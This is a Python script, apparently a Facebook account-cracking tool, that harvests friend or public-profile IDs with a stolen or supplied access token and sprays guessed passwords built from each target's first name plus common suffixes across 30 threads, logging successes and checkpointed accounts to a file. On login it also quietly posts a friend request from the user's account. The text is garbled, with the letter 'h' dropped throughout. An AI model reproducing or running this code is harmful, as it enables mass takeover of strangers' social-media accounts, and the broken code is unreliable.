import os,sys,time,datetime,random,aslib,re,treading,json,urllib,cookielib,requests,mecanize
from multiprocessing.pool import TreadPool
from requests.exceptions import ConnectionError
from mecanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
 

br = mecanize.Browser()
br.set_andle_robots(False)
br.set_andle_refres(mecanize._ttp.HTTPRefresProcessor(),max_time=1)
br.addeaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Crome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Crome/79.0.3945.116 Mobile Safari/537.36')]
br.addeaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
def acak(b):
    w = 'atdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
def cetak(b):
    w = 'atdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flus()
		time.sleep(00000.1)
##### LOGO #####
logo = """
   Asif Javed
   ▄︻̷̿┻̿═━一
   THE ANONYMOUS Hner TRICKER 
   THE LEGEND ℒℴνℯ
   THE GAME CHANGER Hner
   Hner ackers
   Hner▄︻̷̿┻̿═━一
\033[1;91m=======================================
\033[1;96mAutor  \033[1;93m: \033[1;92mHner
\033[1;96mYouTube \033[1;93m: \033[1;92mHnet
\033[1;96mGitHub  \033[1;93m: \033[1;92mttps://gitub.com/Hner/love
\033[1;96mBlogger \033[1;93m: \033[1;92mttps://www.facebook.com/Hner
\033[1;91m======================================="""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print logo
		print("\r\033[1;96m \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flus();time.sleep(1)
back = 0
berasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print "\033[1;96m ========================================="
print  """\033[1;91m=======================================
\033[1;96mAutor  \033[1;93m: \033[1;92mner
\033[1;96mYouTube \033[1;93m: \033[1;92mHnerHacker
\033[1;96mGitHub  \033[1;93m: \033[1;92mttps://gitub.com/Hneracker/love
\033[1;96mpage \033[1;93m: \033[1;92mttps://www.facebook.com/ner
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
CorrectUsername = "ner"
CorrectPassword = "03094161457"
loop = 'true'
wile (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open ttps://www.facebook.com/Anonymoustricker1')
    else:
        print "Wrong Username"
        os.system('xdg-open ttps://www.facebook.com/Anonymoustricker1')
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
		id = raw_input('\033[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('ttps://m.facebook.com')
		except mecanize.URLError:
			print"\n\033[1;96m \x1b[1;91mTere is no internet connection"
			keluar()
		br._factory.is_tml = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_macine_id=1generate_session_cookies=1locale=en_USmetod=aut.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_macine_id":"1","generate_session_cookies":"1","locale":"en_US","metod":"aut.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=aslib.new("md5")
				x.update(sig)
				a=x.exdigest()
				data.update({'sig':a})
				url = "ttps://api.facebook.com/restserver.pp"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m\x1b[1;92mLogin Successful'
				os.system('xdg-open ttps://www.facebook.com/Anonymoustricker1')
				requests.post('ttps://grap.facebook.com/me/friends?metod=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m \x1b[1;91mTere is no internet connection"
				keluar()
		if 'ceckpoint' in url:
			print("\n\033[1;96m \x1b[1;91mIt seems tat your account as a ceckpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('ttps://grap.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m \033[1;91mIt seems tat your account as a ceckpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m \x1b[1;91mTere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
	pili()
def pili():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pili()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pili()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	pili_super()
def pili_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pili_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("ttps://grap.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("ttps://grap.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m \033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("ttps://grap.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m \x1b[1;93mEnter File Pat  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m \x1b[1;91mFile Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pili_super()
	
	print "\033[1;96m \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m \033[1;93mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flus();time.sleep(1)
	print
	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Ten Press z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('ttps://grap.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('kan123')
			data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m |\x1b[1;97m ' + pass1
					cek = open("out/ceckpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'Ali123'
					data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/ceckpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '987654'
							data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/ceckpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Pakistan'
									data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/ceckpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'qwertyuiop'
											data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/ceckpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'Hacker123'
													data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/ceckpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('ttps://grap.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '456456'
															data = urllib.urlopen("ttps://b-api.facebook.com/metod/aut.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCeckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/ceckpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = TreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/ceckpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
if __name__ == '__main__':
	login()
